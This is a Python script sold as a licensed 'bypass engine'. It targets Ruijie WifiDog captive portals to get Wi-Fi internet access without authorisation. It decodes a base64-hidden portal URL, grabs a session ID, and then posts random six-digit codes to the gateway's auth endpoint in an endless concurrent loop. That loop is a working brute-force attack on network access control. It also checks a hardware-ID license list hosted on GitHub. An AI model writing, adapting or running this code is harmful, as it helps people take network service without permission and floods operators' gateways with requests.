#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import time
import json
import base64
import random
import string
import hashlib
import requests
import threading
import aiohttp
import asyncio
import ping3
import subprocess
from datetime import datetime, date
from urllib.parse import quote, urlparse, parse_qs, urljoin

# ==========================================
# 0. GITHUB LICENSE SYSTEM
# ==========================================
# လူကြီးမင်းရဲ့ GitHub Database Link
GITHUB_KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

def get_hwid():
    try:
        # Termux hardware ID logic
        cmd = "settings get secure android_id"
        raw_id = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode().strip()
        if not raw_id: raise Exception
    except:
        raw_id = str(os.getlogin()) + "MOEYU_PRO_BYPASS"
    return hashlib.md5(raw_id.encode()).hexdigest()[:16].lower()

def check_license():
    my_hwid = get_hwid()
    print(f"{w}[*] Your HWID: {g}{my_hwid}{w}")
    print(f"{w}[*] Status   : Verifying Access...", end="\r")
    
    try:
        res = requests.get(GITHUB_KEY_URL, timeout=15)
        if res.status_code != 200:
            print(f"{r}[!] GitHub Database Error.{w}")
            return False
        
        lines = [line.strip() for line in res.text.splitlines() if line.strip()]
        for line in lines:
            parts = [p.strip() for p in line.split(',')]
            # HWID ကို Case Insensitive (အကြီးအသေးမရွေး) စစ်ဆေးခြင်း
            if parts[0].lower() == my_hwid:
                exp_date_str = parts[2] if len(parts) > 2 else "2099-12-31"
                exp_date = datetime.strptime(exp_date_str, "%Y-%m-%d").date()
                
                if date.today() > exp_date:
                    print(f"{r}[!] License Expired on {exp_date_str}!{w}")
                    return False
                
                print(f"{g}[✓] Access Granted! Expiry: {exp_date_str}{w}")
                return True
                
        print(f"{r}[!] HWID Not Registered! Please contact admin.{w}")
        return False
    except Exception as e:
        print(f"{r}[!] Connection Error. Please check your internet.{w}")
        return False

# ==========================================
# COLORS & DISPLAY
# ==========================================
w = "\033[1;00m"; g = "\033[1;32m"; y = "\033[1;33m"; r = "\033[1;31m"; b = "\033[1;34m"

def clear():
    os.system("clear")

def Line():
    print(f"{y}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{w}")

def Logo():
    clear()
    logo = f"""{r}
  __  __  ____  ______     ____  _ 
 |  \/  |/ __ \|  ____|   |  _ \| |
 | \  / | |  | | |__      | |_) | |
 | |\/| | |  | |  __|     |  _ <| |
 | |  | | |__| | |____    | |_) |_|
 |_|  |_|\____/|______|   |____/(_)
                                   
{g}        >> MOEYU BYPASS PRO ENGINE v5.2 <<{w}"""
    print(logo)
    Line()
    print(f"{w}[#] Developer : Moe Yu")
    print(f"{w}[#] Telegram  : @starlink112")
    print(f"{w}[#] Mode      : Ruijie Internet Bypass")
    Line()

# ==========================================
# INTERNET BYPASS CORE
# ==========================================
async def get_session_id(session, url, current_sid):
    try:
        async with session.get(url, timeout=10) as response:
            final_url = str(response.url)
            sid = re.search(r"sessionId=([a-zA-Z0-9]+)", final_url)
            return sid.group(1) if sid else current_sid
    except:
        return current_sid

class InternetAccess:
    def __init__(self):
        # Ruijie WifiDog URL
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
        
        if not os.path.exists(".ip"):
            setup()
        self.ip = open(".ip", "r").read().strip()

    async def send_payload(self, session, sid):
        code = "".join(random.choices(string.digits, k=6))
        params = {'token': sid, 'phoneNumber': code}
        try:
            async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params=params, timeout=5) as resp:
                now = datetime.now().strftime('%H:%M:%S')
                # Google Ping Check
                ping_val = await asyncio.to_thread(ping3.ping, 'google.com')
                ping_str = f"{g}{int(ping_val*1000)}ms" if ping_val else f"{r}Timeout"
                
                print(f"{w}[{now}] Status: {g}{resp.status}{w} | Ping: {ping_str}{w} | Code: {y}{code}{w}", end="\r")
        except:
            pass

    async def execute(self):
        Logo()
        print(f"{y}[*] Initializing Bypass Engine...{w}")
        
        async with aiohttp.ClientSession() as session:
            sid = await get_session_id(session, self.session_url, None)
            if not sid:
                print(f"{r}[!] Connection Failed! Check Wi-Fi.{w}")
                return

            print(f"{g}[✓] Session Active: {sid}{w}")
            Line()
            
            loop = 0
            while True:
                if loop % 10 == 0:
                    sid = await get_session_id(session, self.session_url, sid)
                
                tasks = [self.send_payload(session, sid) for _ in range(5)]
                await asyncio.gather(*tasks)
                await asyncio.sleep(1)
                loop += 1

def setup():
    Logo()
    print(f"{y}[*] Running First-Time Setup...{w}")
    try:
        # Gateway IP ကို အလိုအလျောက်ရှာခြင်း
        res = requests.get("http://192.168.0.1", timeout=5).url
        gw_ip = re.search(r'gw_address=(.*?)&', res).group(1)
        with open(".ip", "w") as f: f.write(gw_ip)
        print(f"{g}[✓] Gateway Detected: {gw_ip}{w}")
    except:
        # Default Ruijie IP ကို သုံးခြင်း
        with open(".ip", "w") as f: f.write("192.168.110.1")
        print(f"{y}[!] Gateway auto-detect failed. Using default.{w}")
    Line()

def main():
    Logo()
    if not check_license():
        sys.exit()
    
    try:
        engine = InternetAccess()
        asyncio.run(engine.execute())
    except KeyboardInterrupt:
        print(f"\n{r}[!] Stopped by User.{w}")

if __name__ == "__main__":
    main()
